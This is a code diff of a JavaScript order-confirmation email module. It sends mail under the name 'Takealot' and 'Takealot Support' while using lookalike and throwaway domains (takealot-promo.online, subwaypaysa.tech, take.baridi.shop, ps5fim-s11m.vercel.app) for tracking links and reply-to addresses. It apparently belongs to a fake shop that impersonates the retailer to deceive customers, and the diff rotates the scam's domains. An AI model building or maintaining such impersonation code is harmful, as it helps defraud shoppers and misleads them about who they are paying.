@@ -89,7 +89,8 @@ function renderOrderEmail(order) {
   const orderDateShort = `${daysShort[d.getDay()]}, ${d.getDate()} ${monthsShort[d.getMonth()]} ${d.getFullYear()}`;
   const deliveryDateIso = del.toISOString().slice(0, 10);
   const deliveryDateLong = `${daysLong[del.getDay()]}, ${del.getDate()} ${monthsLong[del.getMonth()]} ${del.getFullYear()}`;
-  const trackingUrl = `https://subwaypaysa.tech/takealot/track.html?order=${order.order_id}`;
+  const siteUrl = process.env.SITE_URL || 'https://ps5fim-s11m.vercel.app';
+  const trackingUrl = `${siteUrl}/track.html?ref=${order.order_id}`;
 
   const items = (Array.isArray(order.items) && order.items.length > 0)
     ? order.items
@@ -167,7 +168,8 @@ function renderOrderPlainText(order) {
 
   const orderDateShort = `${daysShort[d.getDay()]}, ${d.getDate()} ${monthsShort[d.getMonth()]} ${d.getFullYear()}`;
   const deliveryDateLong = `${daysLong[del.getDay()]}, ${del.getDate()} ${monthsLong[del.getMonth()]} ${del.getFullYear()}`;
-  const trackingUrl = `https://subwaypaysa.tech/takealot/track.html?order=${order.order_id}`;
+  const siteUrl = process.env.SITE_URL || 'https://ps5fim-s11m.vercel.app';
+  const trackingUrl = `${siteUrl}/track.html?ref=${order.order_id}`;
 
   const items = (Array.isArray(order.items) && order.items.length > 0)
     ? order.items
@@ -251,7 +253,7 @@ async function sendOrderConfirmationEmail(order) {
           subject,
           html: html || plainText,
           text: plainText,
-          reply_to: process.env.EMAIL_REPLY_TO || 'support@take.baridi.shop',
+          reply_to: process.env.EMAIL_REPLY_TO || 'support@ps5fim-s11m.vercel.app',
         }),
       });
       const data = await res.json().catch(() => null);
@@ -288,7 +290,7 @@ async function sendOrderConfirmationEmail(order) {
         subject,
         text: plainText,
         html: html || plainText,
-        replyTo: 'support@takealot-promo.online',
+        replyTo: 'support@ps5fim-s11m.vercel.app',
       });
       console.log('[email] Sent via SMTP:', info.messageId);
       return { sent: true, messageId: info.messageId };
@@ -300,8 +302,8 @@ async function sendOrderConfirmationEmail(order) {
   // 3. SendGrid
   const sendgridKey = process.env.SENDGRID_API_KEY;
   if (sendgridKey) {
-    const fromEmail = process.env.EMAIL_FROM || 'orders@takealot-promo.online';
-    const cleanFrom = fromEmail.replace(/^.*<([^>]+)>.*$/, '$1') || 'orders@takealot-promo.online';
+    const fromEmail = process.env.EMAIL_FROM || 'orders@onboarding.resend.dev';
+    const cleanFrom = fromEmail.replace(/^.*<([^>]+)>.*$/, '$1') || 'orders@onboarding.resend.dev';
     try {
       const res = await fetch('https://api.sendgrid.com/v3/mail/send', {
         method: 'POST',
@@ -312,7 +314,7 @@ async function sendOrderConfirmationEmail(order) {
         body: JSON.stringify({
           personalizations: [{ to: [{ email: order.customer_email }] }],
           from: { email: cleanFrom, name: 'Takealot' },
-          reply_to: { email: 'support@takealot-promo.online', name: 'Takealot Support' },
+          reply_to: { email: 'support@ps5fim-s11m.vercel.app', name: 'Takealot Support' },
           subject,
           content: [
             { type: 'text/plain', value: plainText },
@@ -335,8 +337,8 @@ async function sendOrderConfirmationEmail(order) {
   // 4. Brevo / Sendinblue
   const brevoKey = process.env.BREVO_API_KEY;
   if (brevoKey) {
-    const fromEmail = process.env.EMAIL_FROM || 'orders@takealot-promo.online';
-    const cleanFrom = fromEmail.replace(/^.*<([^>]+)>.*$/, '$1') || 'orders@takealot-promo.online';
+    const fromEmail = process.env.EMAIL_FROM || 'orders@onboarding.resend.dev';
+    const cleanFrom = fromEmail.replace(/^.*<([^>]+)>.*$/, '$1') || 'orders@onboarding.resend.dev';
     try {
       const res = await fetch('https://api.brevo.com/v3/smtp/email', {
         method: 'POST',
@@ -350,7 +352,7 @@ async function sendOrderConfirmationEmail(order) {
           subject,
           htmlContent: html || plainText,
           textContent: plainText,
-          replyTo: { email: 'support@takealot-promo.online', name: 'Takealot Support' },
+          replyTo: { email: 'support@ps5fim-s11m.vercel.app', name: 'Takealot Support' },
         }),
       });
       const data = await res.json().catch(() => null);
@@ -381,7 +383,7 @@ async function sendOrderConfirmationEmail(order) {
           subject,
           html: html || plainText,
           text: plainText,
-          reply_to: 'support@takealot-promo.online',
+          reply_to: 'support@ps5fim-s11m.vercel.app',
         }),
       });
       const data = await res.json().catch(() => null);
@@ -499,7 +501,7 @@ module.exports = async function handler(req, res) {
     product_image:  body.productImage || 'combo-silver.jpg',
     received_date:  now,
     delivery_date:  deliveryDate,
-    tracking_url:   'https://www.takealot-promo.online/track.html?order=' + encodeURIComponent(orderId),
+    tracking_url:   (process.env.SITE_URL || 'https://ps5fim-s11m.vercel.app') + '/track.html?ref=' + encodeURIComponent(orderId),
     status:         'PROCESSING',
     status_history: [
       { status: 'RECEIVED',   timestamp: now },
